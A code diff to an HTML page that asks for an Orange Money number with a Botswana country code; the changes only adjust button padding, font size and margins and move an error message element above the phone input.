@@ -57,14 +57,14 @@ body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-conten
   color:#fff;
   border-radius:999px;
   box-shadow:0 10px 18px rgba(239,95,45,.14);
-  padding:18px 18px;
+  padding:16px 18px;
   text-align:center;
-  font-size:clamp(22px,4vw,42px);
+  font-size:clamp(20px,3.8vw,38px);
   font-weight:800;
   line-height:1.12;
   letter-spacing:-.04em;
   display:none;
-  margin-top:12px;
+  margin:0 0 12px;
   z-index:1;
 }
 
@@ -142,6 +142,8 @@ body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-conten
 
     <div class="phone-title">Enter your Orange Money<br>number</div>
 
+    <div id="error" class="error" aria-live="assertive"></div>
+
     <div class="phone-box">
       <div class="country" aria-label="Botswana country code">
         <span class="flag" aria-label="Botswana flag">
@@ -163,7 +165,6 @@ body{background:#070b10;color:#111;min-height:100dvh;display:flex;justify-conten
 
     <div class="terms">By using this service you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a></div>
     <button class="next-btn" id="nextBtn" type="button">NEXT</button>
-    <div id="error" class="error" aria-live="assertive"></div>
     <div class="secure"><span class="lock">◌</span> SSL ENCRYPTED AND SECURE</div>
   </div>
 </div>
